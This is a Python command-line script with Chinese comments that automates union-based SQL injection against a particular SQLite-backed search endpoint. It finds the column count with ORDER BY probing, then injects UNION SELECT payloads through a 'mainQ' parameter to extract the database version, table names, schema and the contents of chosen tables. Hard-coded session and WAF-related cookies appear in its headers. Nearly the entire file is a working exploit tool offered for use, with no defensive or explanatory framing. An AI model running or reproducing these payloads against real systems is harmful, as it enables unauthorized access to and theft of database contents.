#! /usr/bin/env python
# _*_  coding:utf-8 _*_

import getopt
import sys
import requests
import re
import urllib

target = ""
table_name = ""
column_name = ""


# 用法
def usage():
    print
    print ("Usage: python sqlite.py -u url --tables")  # 获取所有表名
    print ("Usage: python sqlite.py -u url --columns")  # 获取所有表结构，从而获取字段值
    print ("Usage: python sqlite.py -u url -T table_name -C column_name -d")  # 获取指定数据
    print ("-t              - get tables")
    print ("-T              - choose a table")
    print ("-c              - get columns")
    print ("-C              - choose a column")
    print ("-d              - get data")
    sys.exit(0)


def SendData(target, poc):
    url = target + poc
    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0",
               "Accept": "application/json, text/javascript, */*; q=0.01",
               "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
               "Accept-Encoding": "gzip, deflate", "Referer": "",
               "Cookie": "safedog-flow-item=C3D1A1E4021D97E59C56A67DC0C53D2D; "
                         "ASP.NET_SessionId=g5vaceg2zozfjv42p4kwmxkb",
               "Connection": "close"}

    response = requests.get(url, headers=headers)
    return response


def handleData(response):
    result = re.findall(r'<xxoo>(.*?)</xxoo>', response.content, re.I)
    return result


class DataBase():
    def __init__(self, target):
        self.version = ""  # 版本信息
        self.tables = []  # 所有表
        self.table_num = 0  # 所有表数目
        self.column_num = 0  # 指定表中数据条数
        self.columns = []  # 字段
        self.datas = []  # 具体数据
        self.target = target  # 目标地址
        self.OrderBy = 200  # order by 初始值
        self.poc_mid = ""  # poc相同部分，初始为空

    def SetPoc(self, action):

        # 获取order by 数目的poc
        if action == "orderby":
            poc0 = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同" \
                   "&q=&pageIndex=1&searchname=&_=1522659952172"
            poc_start = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同%') "
            poc_end = "--&q=&pageIndex=1&searchname=&_=1522659952172"
            response0 = SendData(target, poc0)
            min = 0
            max = self.OrderBy
            middle = (max+min) / 2
            while self.OrderBy > 0:
                ordpoc1 = (poc_start + "order by {0}" + poc_end).format(middle)
                ordpoc2 = (poc_start + "order by {0}" + poc_end).format(middle + 1)
                response1 = SendData(target, ordpoc1)
                response2 = SendData(target, ordpoc2)
                if response0.status_code != response1.status_code:
                    max = middle
                    middle = (min+max) / 2
                else:
                    if response1.status_code == response2.status_code:
                        
                        if response1.status_code == 200:
                            min = middle
                            middle = (min+max) / 2
                        else:
                            max = middle
                            middle = (min+max) / 2
                    else:
                        self.OrderBy = middle
                        print ("》Order By number is %s" % self.OrderBy)
                        break                   

        # 获取版本信息的poc
        elif action == "version":
            verpoc_start = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同%') " \
                           "and 1=2 UNION SELECT null,'<xxoo>'||sqlite_version()||'</xxoo>'"
            verpoc_end = " from sqlite_master--&q=&pageIndex=1&searchname=&_=1522659952172"
            order_num = self.OrderBy
            while order_num > 2:
                self.poc_mid = self.poc_mid + ",null"
                order_num = order_num - 1
            verpoc = verpoc_start + self.poc_mid + verpoc_end
            #print self.poc_mid
            return verpoc

        # 获取表数量的poc
        elif action == "tabnum":
            tabnumpoc_start = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同%') " \
                          "and 1=2 UNION SELECT null,'<xxoo>'||count(1)||'</xxoo>'"
            tabnumpoc_end = " from sqlite_master--&q=&pageIndex=1&searchname=&_=1522659952172"
            tabnumpoc = tabnumpoc_start + self.poc_mid + tabnumpoc_end
            return tabnumpoc

        # 获取所有表名的poc
        elif action == "tables":
            tablespoc_start = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同%') " \
                      "and 1=2 UNION SELECT null,'<xxoo>'||name||'</xxoo>'"
            tablespoc_end = " from sqlite_master limit 0,{0}--&q=&pageIndex=1&searchname=&_=1522659952172".format(
            self.table_num)
            tablespoc = tablespoc_start + self.poc_mid + tablespoc_end
            return tablespoc

        # 获取所有表结构的poc
        elif action == "columns":
            columnspoc_start = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同%') " \
                   "and 1=2 UNION SELECT null,'<xxoo>'||sql||'</xxoo>'"
            columnspoc_end = " from sqlite_master limit 0,{0}--&q=&pageIndex=1&searchname=&_=1522659952172".format(self.table_num)
            columnspoc = columnspoc_start + self.poc_mid + columnspoc_end
            return columnspoc

        # 获取指定表数据条数的poc
        elif action == "datanum":
            datanumpoc_start = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同%') " \
                   "and 1=2 UNION SELECT null,'<xxoo>'||count(1)||'</xxoo>'"
            datanumpoc_end = " from {0}--&q=&pageIndex=1&searchname=&_=1522659952172".format(table_name)
            datanumpoc = datanumpoc_start + self.poc_mid + datanumpoc_end
            return datanumpoc

# 获取具体数据的poc
        elif action == "data":
            datapoc_start = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同%') " \
                "and 1=2 UNION SELECT null,'<xxoo>'||{0}||'</xxoo>'".format(column_name)
            datapoc_end = " from {0} limit 0,{1}--&q=&pageIndex=1&searchname=&_=1522659952172".format(table_name, self.column_num)
            datapoc = datapoc_start + self.poc_mid + datapoc_end
            return datapoc

        else:
            pass

    # 获取信息
    def GetInfo(self, target):
        # 遍历order by
        ord_action = "orderby"
        self.SetPoc(ord_action)

        # 获取版本信息
        ver_action = "version"
        verpoc = self.SetPoc(ver_action)
        ver_response = SendData(target, verpoc)
        self.version = handleData(ver_response)
        print ("》版本信息：%s" % self.version)

        # 获取表数目
        tabnum_action = "tabnum"
        tabnumpoc = self.SetPoc(tabnum_action)
        tabnum_response = SendData(target, tabnumpoc)
        self.table_num = int(handleData(tabnum_response)[0])
        print ("》》总共有%s张表" % self.table_num)

    # 获取表信息
    def GetTables(self, target):
        # 遍历所有表名
        action = "tables"
        tablespoc = self.SetPoc(action)
        tables_response = SendData(target, tablespoc)
        self.tables = handleData(tables_response)
        print ("》》》表名")
        for tab in self.tables:
            print (tab)

    # 获取字段信息
    def GetColumns(self, target):
        # 首先获取表结构,从表结构中获取字段
        action = "columns"
        cloumnspoc = self.SetPoc(action)
        cloumns_response = SendData(target, cloumnspoc)
        self.columns = handleData(cloumns_response)
        print ("》》》表结构")
        for col in self.columns:
            print (col)
            print

    # 获取数据
    def GetData(self, target,table_name,column_name):
        # 获取指定表中数据条数
        datanum_action = "datanum"
        datanumpoc = self.SetPoc(datanum_action)
        datanum_response = SendData(target, datanumpoc)
        datanum_result = handleData(datanum_response)
        self.column_num = int(datanum_result[0])  # 获取当前表的数据条数
        print ("》》》》当前表{0}有{1}条数据".format(table_name, self.column_num))

        #获取具体数据内容
        datas_action = "data"
        datapoc = self.SetPoc(datas_action)
        data_response = SendData(target, datapoc)
        self.datas = handleData(data_response)
        print ("》》》》当前表{0}字段{1}的内容有".format(table_name, column_name))
        for data in self.datas:
            print (data)

def main():
    global target
    global table_name
    global column_name
    global database

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hu:tT:cC:d",
                                   ["help", "url", "tables", "table", "columns", "column", "dump"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    print target
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-u", "--url"):
            target = a
            database = DataBase(target)
            database.GetInfo(target)
        elif o in ("-t", "--tables"):
            database.GetTables(target)
        elif o in ("-T", "--table"):
            table_name = a
        elif o in ("-c", "--columns"):
            database.GetColumns(target)
        elif o in ("-C", "--column"):
            column_name = a
        elif o in ("-d", "--dump"):
            database.GetData(target,table_name,column_name)
        else:
            assert False, "Unhandled Option"

main()
